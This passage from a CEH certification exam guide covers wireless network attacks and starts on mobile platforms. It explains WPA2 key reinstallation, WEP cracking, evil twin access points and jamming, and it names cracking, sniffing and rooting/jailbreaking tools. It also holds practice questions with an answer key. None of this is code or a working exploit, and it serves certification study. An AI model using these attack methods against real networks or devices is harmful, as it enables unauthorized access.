advantage of the way WPA2 works. In 2016 a couple of Belgian researchers discovered
that by repeatedly resetting and replaying a portion of traffic, they could eventually learn
the full key used to encrypt all traffic.

The researchers targeted WPA2’s use of a four-way handshake to establish a nonce,
a one-time-use shared secret for the communication session. Since wireless isn’t as
reliable as a wired connection and occasionally you’ll have drop-offs and disconnections,
and since the standard takes into account these disconnections could occur during the
handshake, WPA2 allows reconnection using the same value for the third handshake.
And because WPA2 doesn’t require a different key to be used each time in this type of
reconnection, an attacker can repeatedly resend the third handshake of another device’s
session to manipulate or reset the WPA2 encryption key.

NOTE All this talk o encryption and keys and such is great, but it bears
mentioning here that use o encryption does not absolve you rom creating
a good password in the irst place (something we’ve already covered).

Each time this key is reset, the reset causes data to be encrypted using the same values.
Therefore, blocks with the same content can be seen and matched and, over time, worked
backward for keychain clues. Since each repeated reset reveals more and more of the
keychain, the attacker can gradually match encrypted packets seen before and, over time,
learn the full keychain used to encrypt the traffic. Voilà!

Wireless Sniffing
Much about sniffing a wireless network is the same as sniffing its wired counterpart.
The same protocols and authentication standard weaknesses you looked for with Wire-
shark off that switch port are just as weak and vulnerable on wireless. Authentication
data, passwords, and other information can be gleaned just from watching the air, and
although you are certainly welcome to use Wireshark, a couple of other tools can help
you get the job done.

Just a few of the tools specifically made for wireless sniffing include some we’ve already
talked about, such as NetStumbler and Kismet, and some that we haven’t discussed yet,
including Omnipeek, AirMagnet, and WiFi Analyzer Pro. Assuming you have a wireless
adapter that is compatible and can watch traffic in promiscuous mode, Omnipeek is a
fairly well-known and respected wireless sniffer (available from https://www.liveaction
.com/). In addition to the same type of traffic analysis you would see in Wireshark,
Omnipeek provides network activity status and monitoring in a nice dashboard for
up-to-the-minute viewing.

AirMagnet WiFi Analyzer is an incredibly powerful sniffer, traffic analyzer, and all-around
wireless network-auditing software suite. It can be used to resolve performance problems
and automatically detect security threats and vulnerabilities. AirMagnet includes a suite of
active WLAN diagnostic tools, that enable network managers to test and diagnose common
wireless network performance issues. And for you compliance paperwork junkies out there,
AirMagnet includes a compliance reporting engine that maps network information to
requirements for compliance with policy and industry regulations.

07-ch07.indd 297 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CEH Certified Ethical Hacker All-in-One Exam Guide

298

The point here isn’t to rehash everything we’ve already talked about regarding sniffing.
What you need to get out of this is the knowledge that sniffing is beneficial to wired
and wireless network attacks, and you need to be able to recognize the tools mentioned
here. Again, I recommend you go out and download these tools. Most, if not all, are
either free or have a great trial version for your use. Read the usage guides and determine
your adapter compatibility; then fire them up and see what you can capture. You won’t
necessarily gain much, exam-wise, by running them, but you will gain valuable experience
for your “real” work.

Chapter Review
In the wireless world, the 802.11 series of standards is very important. 802.11a can attain
speeds up to 54 Mbps and uses the 5 GHz range. 802.11b has speeds of 11 Mbps at
2.4 GHz, and 802.11g is 54 Mbps at 2.4 GHz. 802.11n has speeds over 100 Mbps and
uses a variety of ranges in MIMO format between 2.4 GHz and 5 GHz. Other standards
of note are 802.11i (an amendment to the original 802.11 series standard that specifies
security mechanisms for use on the WLAN), 802.15.1 (Bluetooth), 802.15.4 (Zigbee)
and 802.16 (global development of broadband wireless metropolitan area networks,
WiMAX).

Modulation—the practice of manipulating properties of a waveform—is the encoding
method of choice in wireless networks. Both orthogonal frequency-division multiplexing
(OFDM) and direct-sequence spread spectrum (DSSS) use various pieces of a waveform
to carry a signal. OFDM works with several waveforms, simultaneously carrying messages
back and forth: the transmission media is divided into a series of frequency bands that
don’t overlap each other, and each of them can then be used to carry a separate signal.
DSSS works differently by combining all the available waveforms into a single purpose;
the entire frequency bandwidth can be used at once for the delivery of a message.

In ad hoc mode, wireless systems connect directly to other systems, as if a cable
were strung between the two. Infrastructure mode uses an access point (AP) to funnel
all wireless connections through, and clients associate and authenticate to it. Wireless
networks can consist of a single access point or multiple ones, thus creating overlapping
cells and allowing a user to roam freely without losing connectivity. The client needs to
associate with an access point first and then disassociate when it moves to the next one.

When there is a single access point, its footprint is called a basic service area (BSA).
Communication between this single AP and its clients is known as a basic service set
(BSS). If you extend the range of your network by adding multiple access points, the
setup is known as an extended service set (ESS). As a client moves from one AP in your
subnet to another, so long as everything is configured correctly, it’ll disassociate from one
AP and (re)associate with another seamlessly. This movement across multiple APs within
a single ESS is known as “roaming.”

Wireless network design needs to take into account not only the type of antenna used
but where it is placed and what is set up to contain or corral the signal. Physical installation
of access points is a major concern because you will want to avoid spillage of the signal and
loss of power. Most standard APs use an omnidirectional antenna, which means the signal

07-ch07.indd 298 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

Chapter 7: Wireless Network Hacking

299

emanates from the antenna in equal strength 360 degrees from the source. Directional
antennas allow you to focus the signal in a specific direction, which greatly increases signal
strength and distance. Other antennas you can use are dipole and parabolic grid. Dipole
antennas have two signal “towers” and work omnidirectionally. Parabolic grid antennas
work a lot like satellite dishes and can have phenomenal range (up to 10 miles) but aren’t
in use much.

To identify a wireless network to clients who may be interested in joining, a service set
identifier (SSID) must be assigned. The SSID is not a password and provides no security
at all for your network. It is a text word (32 characters or less) that only distinguishes your
wireless network from others. SSIDs are broadcast by default and are easily obtainable
even if you try to turn off the broadcast (in an effort dubbed “SSID cloaking”). The
SSID is part of the header on every packet, so its discovery by a determined attacker is a
given, and securing it is virtually a moot point.

Wireless authentication can happen in more than a few ways, from the simplistic to
the complicated. There are three main methods: Open System Authentication, Shared
Key Authentication, and Centralized Authentication (for example, RADIUS). In Open
System Authentication, a client can simply send an 802.11 authentication frame with
the appropriate SSID to an AP and have it answer with a verification frame. In Shared
Key Authentication, the client participates in a challenge/request scenario, with the AP
verifying a decrypted “key” for authentication. And you can even tie all the bits and
pieces of wireless authentication mechanisms together with an authentication server
(RADIUS), forcing the client into an even more complicated authentication scenario.
Association is the action of a client connecting to an AP, whereas authentication actually
identifies the client before it can access anything on the network.

WEP stands for Wired Equivalent Privacy and provides weak security for the wireless
network. Using 40-bit to 232-bit keys in an RC4 encryption algorithm, WEP’s primary
weakness lies in its reuse of initialization vectors (IVs)—an attacker can simply collect
enough packets to decode the WEP shared key. WEP was never intended to fully protect
your data; it was designed to give people using a wireless network the same level of
protection that someone surfing over an Ethernet wired hub would expect. WEP’s IVs
are relatively small and, for the most part, get reused pretty frequently. Additionally,
they’re sent in clear text as part of the header. An attacker simply needs to generate
enough packets to analyze the IVs and come up with the key used.

A better choice in encryption technology is Wi-Fi Protected Access (WPA) or WPA2.
WPA makes use of Temporal Key Integrity Protocol (TKIP), a 128-bit key, and the
client’s MAC address to accomplish much stronger encryption. WPA changes the key out
(hence the “temporal” part of the name) every 10,000 packets or so, instead of sticking
with one and reusing it. Additionally, the keys are transferred back and forth during an
Extensible Authentication Protocol (EAP) authentication session, which uses a four-step
handshake process in proving the client belongs to the AP, and vice versa.

WPA2 is much the same process; however, it was designed with the government and the
enterprise in mind. In something called WPA2 Enterprise, you can tie EAP or a RADIUS
server into the authentication side of WPA2, allowing you to use Kerberos tickets and
additional offerings. WPA2 uses AES for encryption, ensuring FIPS 140-2 compliance.

07-ch07.indd 299 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CEH Certified Ethical Hacker All-in-One Exam Guide

300

As for integrity, WPA2 addresses this by using the Cipher Block Chaining Message
Authentication Code Protocol (CCMP), with message integrity codes (MICs), in a process
called cipher block chaining message authentication code (CBC-MAC).

WPA-3 is another wireless encryption method, which uses AES-GCMP-256 for
encryption and HMAC-SHA-384 for authentication. WPA-3 Personal uses something
called Dragonfly Key Exchange to deliver password-based authentication through SAE
and is resistant to offline and key recovery attacks. WPA-3 Enterprise uses multiple
encryption algorithms to protect data and employs ECDSA-384 for exchanging keys.

Issues exist for every encryption mechanism. WEP issues are plentiful, and it is
particularly susceptible to known-plaintext attacks. Password attacks against it are
relatively simple and easy to pull off. WPA’s pre-shared key is vulnerable to eavesdropping
and offline attacks, and its TKIP function is vulnerable to packet spoofing. WPA2 also
shares the same pre-shared key issues, and the so-called “Hole196” vulnerability (https://
www.infosecurity-magazine.com/blogs/wpa2-exposed-with-hole-196-vulnerability/)
makes it vulnerable to man-in-the-middle (MITM) and denial-of-service (DoS) attacks.

An AirPcap dongle is a USB wireless adapter that offers several advantages as well
as software support, but has since been deprecated and replaced by other models. The
term “airpcap dongle” is still used to refer to many of these. WiGLE helps in identifying
geographic locations of wireless networks. Teams of hackers have mapped out wireless
network locations using GPS and a tool called NetStumbler. NetStumbler can be used
for identifying poor coverage locations within an ESS, detecting interference causes, and
finding any rogue access points in the network. It’s Windows based, easy to use, and
compatible with 802.11a, b, and g.

Kismet is another wireless discovery option. It works on Linux-based systems and,
unlike NetStumbler, works passively, meaning it detects access points and clients without
actually sending any packets. It can detect access points that have not been configured
(and would then be susceptible to the default out-of-the-box admin password) and will
determine which type of encryption you might be up against. It works by “channel
hopping” to discover as many networks as possible and has the ability to sniff packets and
save them to a log file, readable by Wireshark or tcpdump.

The rogue access point is an easy attack on a wireless network whereby an attacker sets
up an access point near legitimate APs and tricks users into associating and authenticating
with it. Sometimes referred to as an “evil twin,” an attack like this is easy to attempt.
The use of rogue APs (evil twins) may also be referenced as a “mis-association attack.”
Additionally, faking a well-known hotspot on a rogue AP (for example, McDonald’s or
Starbucks free Wi-Fi spots) is referred to as a “honeyspot attack.”

Denial-of-service efforts are also easy attacks to attempt. In addition to other attacks,
you can jam the wireless signal altogether, using some type of jamming device and,
usually, a high-gain antenna/amplifier. All wireless devices are susceptible to some form
of jamming and/or interference—it’s simply a matter of placing enough signal out in the
airwaves that the NICs can’t keep up.

Cracking WEP is ridiculously easy and can be done with any number of tools. The
idea revolves around generating enough packets to effectively guess the encryption key.

07-ch07.indd 300 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

Chapter 7: Wireless Network Hacking

301

The weak IVs are the key; that is, they’re reused and sent in clear text. Tools for cracking
WEP include Cain and Abel and Aircrack (both use Korek, but Aircrack is faster) as
well as KisMAC, WEPCrack, and Elcomsoft Wireless Security Auditor. KisMAC runs
on macOS and can be used to brute-force WEP or WPA. On WEP, Aircrack can use a
dictionary technique, or a variety of weirdly named algorithmic processes called PTW,
FMS, and the Korek technique, while only a dictionary technique can be used against
WPA and WPA2.

Questions
1. A WPA2 wireless network is discovered during a pen test. Which of the following

methods is the best way to crack the network key?
A. Capture the WPA2 authentication traffic and crack the key.
B. Capture a large amount of initialization vectors and crack the key inside.
C. Use a sniffer to capture the SSID.
D. WPA2 cannot be cracked.

2. You are discussing wireless security with your client. He tells you he feels safe
with his network because he has turned off SSID broadcasting. Which of the
following is a true statement regarding his attempt at security?
A. Unauthorized users will not be able to associate because they must know the

SSID in order to connect.
B. Unauthorized users will not be able to connect because DHCP is tied to

SSID broadcast.
C. Unauthorized users will still be able to connect because nonbroadcast SSID

puts the AP in ad hoc mode.
D. Unauthorized users will still be able to connect because the SSID is still sent

in all packets, and a sniffer can easily discern the string.
3. You are discussing wireless security with your client. She tells you she feels safe

with her network because she has implemented MAC filtering on all access points,
allowing only MAC addresses from clients she personally configures in each list.
You explain this step will not prevent a determined attacker from connecting to
her network. Which of the following explains why the APs are still vulnerable?
A. WEP keys are easier to crack when MAC filtering is in place.
B. MAC addresses are dynamic and can be sent via DHCP.
C. An attacker could sniff an existing MAC address and spoof it.
D. An attacker could send a MAC flood, effectively turning the AP into a hub.

07-ch07.indd 301 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CEH Certified Ethical Hacker All-in-One Exam Guide

302

4. What information is required in order to attempt to crack a WEP AP?
(Choose two.)
A. Network SSID
B. MAC address of the AP
C. IP address of the AP
D. Starting sequence number in the first initialization vector

5. Which of the following protects against man-in-the-middle attacks in WPA?
A. MIC
B. CCMP
C. EAP
D. AES

6. Which of the following is the best choice for detecting wireless LANs using the
802.11a/b/g/n WLAN standards on a Linux platform?
A. Kismet
B. Nessus
C. NetStumbler
D. Cain and Abel

7. A user calls with a problem. Her laptop uses the same hardware and software as
many of the other clients on the network, and she can see the wireless network
but cannot connect. You run a sniffer, and results show the WAP is not responding
to the association requests being sent by the wireless client. Of the following
choices, which is the most likely source of the problem?
A. The wireless client does not use DHCP.
B. The wireless client is on the wrong wireless channel.
C. The WAP has MAC filtering engaged and does not recognize the MAC.
D. SSID security is preventing the connection.

8. Which of the following provides for integrity in WPA2?
A. AES
B. CCMP
C. TKIP
D. RADIUS

9. Which of the following is a true statement?
A. Configuring a strong SSID is a vital step in securing your network.
B. An SSID should always be more than eight characters in length.

07-ch07.indd 302 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

Chapter 7: Wireless Network Hacking

303

C. An SSID should never be a dictionary word or anything easily guessed.
D. SSIDs are important for identifying networks but do little to nothing

for security.
10. Which wireless encryption technology makes use of temporal keys?

A. WAP
B. WPA
C. WEP
D. EAP

11. Which wireless technology uses RC4 for encryption?
A. WAP
B. WPA
C. WEP
D. WPA2
E. All of the above

Answers
1. A. WPA2 is a strong encryption method, but almost everything can be hacked,

given enough time. Capturing the password pairwise master key (PMK) during
the handshake is the best way to do it, and even then it’s virtually impossible if it’s
a complicated password.

2. D. Turning off the broadcast of an SSID is a good step, but SSIDs do nothing in
regard to security. The SSID is included in every packet, regardless of whether it’s
broadcast from the AP.

3. C. MAC filtering is easily hacked by sniffing the network for a valid MAC and
then spoofing it, using any number of options available.

4. A, B. The network SSID and the MAC address of the AP are required for
attempting a WEP crack.

5. A. A MIC (message integrity code) provides integrity checking in WPA, verifying
frames are authentic and have not been tampered with. Part of how it accomplishes
this is a sequence number—if any frames arrive out of sequence, the whole session
is dropped.

6. A. Kismet is your best option here, as the other tools simply don’t fit the bill.
7. C. There may be more to the story, but given everything in the scenario, MAC

filtering is probably the culprit here. Given the same hardware and software
setup, it’s unlikely it’s a channel issue, and the other options make no sense at all.

07-ch07.indd 303 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 7

CEH Certified Ethical Hacker All-in-One Exam Guide

304

8. B. Cipher Block Chaining Message Authentication Code Protocol uses message
integrity codes (MICs) for integrity purposes.

9. D. An SSID is used for nothing more than identifying the network. It is not
designed as a security measure.

10. B. WPA uses temporal keys, making it a much stronger encryption choice
than WEP.

11. C. WEP uses RC4, which is part of the reason it’s so easily hacked and not
considered a secure option.

07-ch07.indd 304 14/09/21 4:01 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CHAPTER

Mobile Communications 8
and the IoT
In this chapter you will

• Describe mobile platorm attacks
• Identiy Mobile Device Management
• Identiy mobile platorms vulnerabilities and attack vectors
• Identiy IoT security threats and attacks
• List IoT security and hacking tools
• List IoT hacking methodology
• Identiy OT security threats and attacks

I’m certain you’ve seen The Matrix series of movies. In short, the movies postulate that
we’re not actually alive, breathing and interacting with each other—we’re actually all just
jacked into a huge computer program simulating everything we perceive as real. There’s
a big temptation here for me to launch into perception versus reality, dimensional varia-
tions and destiny versus free will, but this is a tech book, not a philosophy class, so I’ll
avoid it. No, what I want to talk about here is the real-life Matrix you may not even be
aware you’re plugging into—the Internet of Things and Internet Everywhere.

I tried to find a single definition of the Internet of Things, but none of them ade-
quately fit the bill for me, so I decided to take a different tack. No matter where you
are, glance around for a second and pick out the things you think are on, or should be
on, your network. I’m sure you can identify some objects pretty quickly. Just a couple
years back you’d point out your cell phone and your PC. Today, you may even point out
other electronic devices that are obvious—your TV, refrigerator, and maybe even your
microwave. Also, there’s your car. But take a closer look. Expand your imagination for
a second.

Your toothbrush might have something to say. Maybe your kitchen counter could
offer advice, too. Your pantry sure has lots to say about what you need to buy—and
perhaps mention that potato you’ve forgotten about rotting on the floor in the corner.
The road and toll booths have information, too. Light bulbs, plumbing systems—heck,
maybe even your cat has valuable information. The Internet of Things is, or soon will
be, all of that.

305

08-ch08.indd 305 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

306

IoT is great to think about, and the benefits to us all in that future dream are fantastic.
But it is also a little scary. Not only could all these “things” be accessed from afar (just
imagine trying to secure them all), but what happens when they all start talking to each
other without your even needing to be a part of the conversation? Suppose, for example,
your toilet and plumbing system notice some disturbing health indicators in your, uh,
creations. What if they just go ahead and schedule your medical appointments for you?
Sound good? Well, what if that information is used to demonstrate your unworthiness as
an insurance policy holder or, lumped together with other citizens’ similar information,
to pass laws making sure everyone eats at least two bowls of kale a day?

Or what if your plumbing system is hacked by a bad guy and you’re held ransom by
your toilet? It’s all really concerning if you consider how much harm all this access and
technology can cause individuals and organizations. I’m not ready to pull the plug and
go off the grid just yet, but I’m wondering just how invasive this can all get, and I’m con-
cerned that by the time we figure out we don’t want it, it will be too late. Not to mention
I don’t want the cat talking to anyone. Ever.

This chapter is all about the mobile world and the Internet of Things. So climb into
Neo’s chair there, jack into the Matrix, and grab the red pill. I’ve got some things to
show you…

The Mobile World
Forget the coming zombie apocalypse—we’re already there. If you’ve been outside any-
where in the United States over the past couple of years, you can’t help but notice it just
as I have: most people are stumbling around, with vacant expressions on their faces, and
only half-heartedly engaging the world around them. Why? Because they spend most of
their waking hours staring down into a smartphone or tablet. And if you’re a parent read-
ing this book and your teenagers can make it through an entire meal without picking up
a phone to text, take a picture of what they’re eating, or post an update of their exciting
life (“I’m eating spaghetti—FOR BREAKFAST!”), you probably should be nominated
for some sort of award.

But come on, admit it: you’re probably one of them, too. We’ve allowed mobile com-
puting to become so much a part of our lives, it’s here to stay. We chat over our mobile
devices, play games with them, do our banking over them, and use them for all sorts of
business. According to Pew Research, a whopping 97 percent of adults own and use a
smartphone, and mobile digital usage stats show a substantial amount of all online time
is spent on mobile devices. The laptop may not be dead as far as a hacking target, but
the mobile army is certainly closing in. Because of all this, EC-Council focuses an entire
chapter of its official courseware on mobile platforms, and I’ll do my best to cover it all
for you here.

NOTE Fun Facts: I read in Google Analytics that 75 percent o people not
only admit to taking their smartphone to the bathroom with them, but
using it while there (the phone, not the toilet). Additionally, most o the
shopping populace use their device while in the store to compare and shop
or the item online.

08-ch08.indd 306 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

307

Mobile Vulnerabilities and Risks
Companies the world over are struggling with implementing policy to contain all this
growth. BYOD (bring your own device) offers some exciting opportunities in potential
cost savings and increased productivity, but at what risk? If Bob uses his own smartphone
and keeps company secrets on it, what happens if/when it gets stolen? Even if the smart-
phone (or tablet) in question isn’t owned by the company, and even if it’s not allowed
access to super-secret-squirrel areas, is it possible Jane could store information on it that
puts all that information at risk?

Although digging through the dumpster for useful information is still a good idea for
the ethical hacker, a sharper focus on mobile definitely is worth your while. A bunch of
users possibly storing sensitive organization information on devices that aren’t centrally
controlled, have little to no security built into them, and have multiple avenues of con-
nectivity (wireless, Bluetooth, and/or 4G/5G)? That sounds like a target-rich environ-
ment to me.

Attacking mobile platforms should be a part of any hacking endeavor and should
definitely become part of your arsenal. Also, you need to know how to attack mobile
platforms for the CEH exam. The bad news is, there’s a lot of information to digest
and remember, and, as always, some of it is weird and off the rails. The good news is,
despite ECC devoting an entire chapter to the subject, a lot of this you already know—or
should, assuming you don’t live under a rock and can read. For example, were you aware
there are multiple operating systems available for mobile (GASP! You don’t say?!?), that
Android and iOS devices can be rooted/jailbroken (SHOCKING!), and that applica-
tions not specifically written by Google or Apple engineers can be put on smartphones
and tablets (SAY IT AIN’T SO!!)? In this convenience versus security realm, I’ll cover
what you need to know and, as always, try to dump the fluff.

When it comes to smartphones, there are three main avenues of attack—three surface
points to look at. First is the device itself, which offers tons of options. Everything from
browser-based attacks (like phishing) to attempts over short message service (SMS, aka
text) and attacks on the applications themselves belong in this realm. And don’t forget
rooting or jailbreaking the device itself (don’t worry—we’ll cover more of that later in this
chapter). Next are the network attacks, covering everything from DNS cache poisoning
to rogue access points and packet sniffing. These attacks should sound very familiar, as
we’ve covered them already and they work just as well here as they do against web servers
and wireless laptops. And, finally, data center or cloud attacks in the mobile world exist
just as they do everywhere else, so don’t think you can get away with not worrying about
those databases and such here either.

OWASP Top 10 Mobile Risks
Remember our discussion of the Open Web Application Security Project (OWASP) in
Chapter 6? Back then we were talking web servers and all things hacking related to them.
But remember when I said OWASP does bunches of other stuff? Welcome to that stuff.

OWASP has an arm dedicated specifically to mobile security (https://owasp.org/
www-project-mobile-security/; see Figure 8-1) and publishes a list of Top 10 mobile risks.
Much like our previous discussion on OWASP’s other Top 10 list, I’ll go over each listed

08-ch08.indd 307 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

308

Figure 8-1 OWASP Mobile Security Project

vulnerability and give you everything you need to know. The current Top 10 (https://
owasp.org/www-project-mobile-top-10/) includes the following vulnerabilities:

• M1: Improper Platform Usage This category covers misuse of a platform
feature or failure to use platform security controls. It might include Android
intents, platform permissions, misuse of TouchID, the Keychain, or some other
security control that is part of the mobile operating system. There are several
ways that mobile apps can experience this risk.

• M2: Insecure Data Storage This category combines a couple entries from
the previous list (2014) and covers insecure data storage and unintended data
leakage. Threat agents include an adversary who has attained a lost/stolen mobile
device as well as malware (or another repackaged app) acting on the adversary’s
behalf that executes on the mobile device.

• M3: Insecure Communication This category covers poor handshaking,
incorrect SSL versions, weak negotiation, clear-text communication of sensitive
assets, and other insecure communication channels or methods. For example,
poor SSL setup can also facilitate phishing and MITM attacks.

• M4: Insecure Authentication This category includes concepts such as failure to
authenticate end users properly and bad session management. Examples include
failing to identify the user at all when it should be required, failure to maintain
the user’s identity when it is required, and weaknesses in session management.

• M5: Insufficient Cryptography This category refers to instances where code
applies cryptography to a sensitive information asset but the cryptography is
insufficient in some way. Note that anything and everything related to TLS or
SSL goes in M3. Also, if the app fails to use cryptography at all when it should,
that probably belongs in M2. This category is for issues where cryptography was
attempted but wasn’t done correctly.

08-ch08.indd 308 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

309

EXAM TIP I I were a sadistic test writer and I wanted to trip someone up
regarding OWASP Top 10 Mobile Risk categories, I’d probably mention
something about a ailed SSL implementation and try to bait the applicants
into choosing M5, thinking it’s about cryptography. I might also query olks
regarding their knowledge o the dierence between authenticating and
authorizing. Just sayin’… In other words, be very careul about mixing up
M5 and M3, or M6 and M4.

• M6: Insecure Authorization This category captures any failures in authorization
(authorization decisions on the client side, forced browsing, and so on). It is
distinct from authentication issues (device enrollment, user identification, and so
on). Remember, authentication proves who you are, whereas authorization proves
you have a right to access a particular resource. For example, if the app grants
anonymous access to some resource or service when the user should have first
been authenticated, then that is an authentication failure, not an authorization
failure. If the app does authenticate users but puts no authorization protections on
memory areas or other resources, that would fall under M6.

• M7: Client Code Quality This category is a catchall for code-level
implementation problems in the mobile client that are distinct from server-side
coding mistakes. This encapsulates issues like buffer overflows, format string
vulnerabilities, and various other code-level mistakes where the solution is to
rewrite some code that’s running on the mobile device.

• M8: Code Tampering This category covers binary patching, local resource
modification, method hooking, method swizzling, and dynamic memory
modification. Once the application is delivered to the mobile device, the code
and data resources are resident there. An attacker can either directly modify the
code, change the contents of memory dynamically, change or replace the system
APIs that the application uses, or modify the application’s data and resources.

• M9: Reverse Engineering This category includes analysis of the final core
binary to determine its source code, libraries, algorithms, and other assets. Software
such as IDA Pro, Hopper, otool, and other binary inspection tools give the attacker
insight into the inner workings of the application. This may be used to exploit
other vulnerabilities in the application, as well as reveal information about back-end
servers, cryptographic constants and ciphers, and intellectual property.

• M10: Extraneous Functionality This is another catchall category for something
coders do all the time: build in a backdoor. These are never intended to be released
into a production environment, but they usually pop up in the weirdest places.
Examples include a developer accidentally including a password as a comment in a
hybrid app or disabling two-factor authentication during testing and forgetting to
turn it back on.

08-ch08.indd 309 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

310

NOTE As with many o their lists, OWASP’s Mobile Risk list appears a bit
dated. For your own ediication, keep an eye out for the new list release. It will
most certainly ind its way into your exam soon ater release. Additionally,
be sure to check out the other inormation available on OWASP’s mobile
security page. As you can see in Figure 8-1, there’s inormation to explore
in those tabs.

Why Do Dogs Bark?
Ever see a notice, warning, study, or article and think, “Duh. Isn’t that obvious?”
A few years back I came across a government-funded study on why dogs bark.
The U.S. government actually paid a bunch of scientific minds to solve this riddle,
befuddling man for eons and preventing us from reaching our full potential, and
here’s what they discovered: dogs bark when something bugs them.

Really? I could’ve told you that for nothing.
Recently, I read an article and I had the same feeling wash over me. The article

(https://www.infosecurity-magazine.com/news/most-orgs-with-byod-enabled-lack/)
references a study from a cloud access provider named Bitglass that found—brace
yourselves—BYOD is prevalent, but not secured. And because it was so ubiquitous
and unsecured, that creates a serious problem for company security professionals.
Yup, you heard it here first—a policy allowing everyone in your organization to bring
their own devices to work and connect/interact with your network puts the whole
thing at risk. Who knew?

The Bitglass 2018 BYOD report showed 85 percent of enterprises now allow
data access from personal devices for employees, partners, customers, and con-
tractors, and, perhaps as a shocking corollary nobody saw coming, more than
half (51 percent) of those enterprises reported a rise in mobile security threats
and attacks. Unbelievable. Next you’ll be telling me water takes the path of least
resistance, the angle of the Earth on its axis plays a big role in the temperature
outside my office window throughout the year, and fried food is bad for me.

The section of the article that was concerning to me, though, was not what was
obvious. Of course allowing BYOD into your environment creates huge attack sur-
faces and results in more attacks. Duh. What concerned me was the seeming indiffer-
ence to what I see as a huge security problem. In another section of the study (a survey
of nearly 400 enterprise IT professionals), it showed 43 percent of organizations are
not able to determine whether the personal devices that are accessing corporate data
have actually downloaded malware, and only 30 percent of firms are confident that
they are properly defending against malware on personal and mobile devices. Think
about that for a second. Almost half the companies freely admit they have no means
to determine if any given smartphone connecting is infected with malware, but a
third of those same companies interviewed think they’ve got a handle on it.

Somehow, I doubt they do. And somehow I think the hacking community knows
it, too.

08-ch08.indd 310 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

311

Figure 8-2
Mobile device
operating
systems

Mobile Platforms and Attacks
When it comes to mobile platforms, there are two major players in the field—Android
and iOS (see Figure 8-2). Android was created by Google specifically for mobile devices,
and it contains an OS, middleware, and a suite of built-in applications for the mobile
user. It offers a framework that allows reuse and replacement of components, media
support for virtually everything you can imagine, a development environment to beat
the band, and really cool names for each release (like Ice Cream Sandwich, Jelly Bean,
Éclair, and Honeycomb—even though they’ve lately gone to simple, boring numbers for
releases). Head on over to https://www.android.com and you’ll find more than you ever
wanted to know about it.

iOS, on the other hand, is Apple’s operating system for mobile devices—that is, the
iPhone and iPad (you will also find iOS on Apple TV and iPods). Apple made its mark
in the desktop world, targeting entertainment and education, and its mobile OS is no
different. iOS was designed from the get-go for mobile devices, using direct manipula-
tion (touch gestures) to interface with the OS. Built-in applications include everything
from entertainment apps to an AI app with a woman’s voice that answers questions for
you (Siri). A good review of everything on the current release can be found at https://
www.apple.com/ios/.

NOTE They’re not nearly as popular as they once were, and EC-Council
basically dropped all reerences to them in the oicial courseware, but
Blackberry phones are still around. Newish Blackberry phones have
ditched their proprietary OS or Android, hence the change in the oicial
courseware, but just be aware they’re still loating about.

Rooting and Jailbreaking
Whether Android or iOS, one topic you will get asked about is rooting or jailbreaking
the device. Both mean the same thing: perform some action that grants you administra-
tive (root) access to the device so you can do whatever you want with it, and there are
hundreds of videos online demonstrating how to do it. Rooting—the name given to the
process on an Android device—is such a common, ubiquitous action that it’s almost
not thought of as technical anymore. And there are multiple tools to help you in your
Android rooting efforts. One such groovy tool is KingoRoot (https://www.kingoapp
.com), and it makes the whole process ridiculously easy with or without a laptop or PC
handy. Others are TunesGo (https://tunesgo.wondershare.com), OneClickRoot (https://
oneclickroot.com), and MTK Droid (https://androidmtk.com).

08-ch08.indd 311 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

312

As far as jailbreaking an iOS device (which, just like rooting, invalidates every warranty
you can think of ), some tools include Cydia (cydiafree.com), Hexxa Plus (pangu8.com),
Apricot (pangu8.com), and yuxigon (yuxigon.com). There are three basic techniques and
three different types, regardless which tool you want to try. Techniques include unteth-
ered, semi-tethered, and tethered:

• Untethered jailbreaking The kernel remains patched (that is, jailbroken) after
reboot, with or without a system connection.

• Semi-tethered jailbreaking A reboot no longer retains the patched kernel;
however, the software has already been added to the device. Therefore, if admin
privileges are required, the installed jailbreaking tool can be used.

• Tethered jailbreaking A reboot removes all jailbreaking patches, and the device
may get stuck in a perpetual loop on startup, requiring a system connection
(USB) to repair.

And the three types of jailbreaking include Userland, iBoot, and BootROM:

• Userland exploit Found in the system itself, which is leveraged to gain root
access, modify the fstab, and patch the kernel. These types of exploits cannot
be tethered because nothing can cause a recovery mode loop, but they can be
patched by Apple. This exploit provides user-level access but not admin.

• iBoot exploit Found in one of the device’s bootloaders, called iBoot (the other
